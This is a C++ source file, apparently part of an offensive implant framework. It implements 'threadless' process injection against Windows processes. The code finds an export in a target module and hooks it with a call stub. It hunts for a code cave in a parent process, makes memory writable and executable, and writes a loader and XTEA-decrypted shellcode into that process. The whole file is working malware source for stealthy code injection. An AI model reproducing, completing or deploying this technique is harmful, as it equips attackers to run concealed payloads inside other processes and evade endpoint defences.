#include <core/corelib.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbFullSize) {
        // todo: needs MmPivot (Flower)
        HEXANE

        HANDLE Proc         = { };
        ULONG Protect       = 0;
        UINT_PTR pExport    = 0;
        UINT_PTR exportCpy  = 0;
        UINT_PTR pHook      = 0;
        SIZE_T Write        = 0;

        if (!(pExport   = Memory::LdrGetExport(SCAST(LPSTR, Threadless.Module.Buffer), RCAST(LPSTR, Threadless.Export.Buffer))) ||
            !(Proc      = Process::LdrGetParentHandle(RCAST(PBYTE, Threadless.Parent.Buffer))) ||
            !(pHook     = Memory::MmCaveHunter(Proc, RCAST(LPVOID, pExport), cbShellcode))) {
            return;
        }

        auto LoaderRva = pHook - (pExport + 5);
        auto hookCpy = pHook;

        MmPatchData(i, RCAST(PBYTE, &exportCpy), (i), RCAST(PBYTE, &pExport), (i), sizeof(LPVOID))
        MmPatchData(i, Threadless.Loader.Buffer, (EXPORT_OFFSET + i), RCAST(PBYTE, &exportCpy), (i), sizeof(LPVOID))
        MmPatchData(i, Threadless.Opcode.Buffer, (CALL_X_OFFSET + i), RCAST(PBYTE, &LoaderRva), (i), 4)

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(PVOID*, &exportCpy), &cbFullSize, PAGE_EXECUTE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, RCAST(PVOID, pExport), RCAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write)) ||
            Write != Threadless.Opcode.Length) {
            return;
        }

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &hookCpy), &cbFullSize, PAGE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
            Write != Threadless.Loader.Length) {
            return;
        }

        Xtea::XteaCrypt(RCAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, cbShellcode, &Write)) || Write != cbShellcode ||
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
            return;
        }

        if (Proc) {
            Ctx->Nt.NtClose(Proc);
        }
    }
}
